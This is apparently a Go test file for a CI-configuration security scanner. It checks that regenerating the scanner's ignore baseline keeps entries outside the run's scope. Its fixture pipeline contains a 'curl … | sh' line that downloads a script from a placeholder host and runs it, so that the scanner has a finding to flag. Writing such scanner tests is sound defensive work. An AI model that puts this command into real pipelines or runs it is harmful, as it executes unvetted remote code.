// twoRules has errors from GL001 (line 2) and GL011 (line 3), and a warning
// from GL053 (line 1).
const twoRules = "job:\n  image: node:latest\n  script: [curl -s https://x.example/i.sh | sh]\n"

// --generate-ignore replaces only the entries this run could have reported:
// those for a scanned file and a rule that ran (#902).
func TestGenerateIgnoreKeepsWhatTheRunDidNotCover(t *testing.T) {
	for _, tc := range []struct {
		name      string
		args      []string
		existing  string
		want      []string // lines, in order, after the header
		wantKept  bool
		forbidden []string
	}{
		{
			name:     "--only keeps the other rules' entries",
			args:     []string{"--only", "GL001"},
			existing: "a.yml:2 GL001\na.yml:3 GL011\n",
			want:     []string{"a.yml:3 GL011", "a.yml:2 GL001"},
			wantKept: true,
		},
		{
			name:     "--skip keeps the skipped rule's entries",
			args:     []string{"--skip", "GL011"},
			existing: "a.yml:3 GL011\n",
			want:     []string{"a.yml:3 GL011", "a.yml:2 GL001", "a.yml:1 GL053"},
			wantKept: true,
		},
		{
			name:     "entries for another file are kept",
			existing: "b.yml:7 GL001\n",
			want:     []string{"b.yml:7 GL001", "a.yml:2 GL001", "a.yml:3 GL011", "a.yml:1 GL053"},
			wantKept: true,
		},
		{
			name:     "an entry keeps its expiry date",
			existing: "a.yml:2 GL001 exp:2027-01-31\n",
			want:     []string{"a.yml:2 GL001 exp:2027-01-31", "a.yml:3 GL011", "a.yml:1 GL053"},
		},
		{
			name:      "an entry the scan no longer reports is dropped",
			existing:  "a.yml:9 GL001\n",
			want:      []string{"a.yml:2 GL001", "a.yml:3 GL011", "a.yml:1 GL053"},
			forbidden: []string{"a.yml:9"},
		},
		{
			name:     "comments and unreadable lines stay",
			existing: "# Generated by glsec --generate-ignore\n# reviewed by the security team\nnot an entry\n",
			want:     []string{"# reviewed by the security team", "not an entry", "a.yml:2 GL001", "a.yml:3 GL011", "a.yml:1 GL053"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			files := map[string]string{"a.yml": twoRules}
			if tc.existing != "" {
				files[".glsec-ignore"] = tc.existing
			}
			code, _, stderr := runCLI(t, files, append(append([]string{"--generate-ignore"}, tc.args...), "a.yml")...)
			if code != 0 {
				t.Fatalf("exit %d; stderr:\n%s", code, stderr)
			}
			data, err := os.ReadFile(".glsec-ignore")
			if err != nil {
				t.Fatal(err)
			}
			got := strings.Split(strings.TrimSuffix(string(data), "\n"), "\n")
			if got[0] != ignoreFileHeader {
				t.Errorf("first line %q, want the header", got[0])
			}
			if strings.Join(got[1:], "\n") != strings.Join(tc.want, "\n") {
				t.Errorf(".glsec-ignore:\n%s\nwant after the header:\n%s", data, strings.Join(tc.want, "\n"))
			}
			for _, f := range tc.forbidden {
				if strings.Contains(string(data), f) {
					t.Errorf(".glsec-ignore still has %q", f)
				}
			}
			if strings.Contains(stderr, "kept ") != tc.wantKept {
				t.Errorf("stderr %q: kept note present = %v, want %v", stderr, !tc.wantKept, tc.wantKept)
			}
		})
	}
}

// A baseline refreshed for one rule still suppresses the others' findings in
// the next full scan.
func TestGenerateIgnoreOnlyThenFullScan(t *testing.T) {
	code, _, stderr := runCLI(t, map[string]string{"a.yml": twoRules, ".glsec-ignore": "a.yml:3 GL011\n"}, "--generate-ignore", "--only", "GL001", "a.yml")
	if code != 0 {
		t.Fatalf("exit %d; stderr:\n%s", code, stderr)
	}
	// Same directory: GL001 and GL011 (both errors) are suppressed now.
	var out, errOut bytes.Buffer
	if code := run([]string{"a.yml"}, &out, &errOut); code != 0 {
		t.Fatalf("full scan after --generate-ignore --only: exit %d; stdout:\n%s", code, out.String())
	}
}
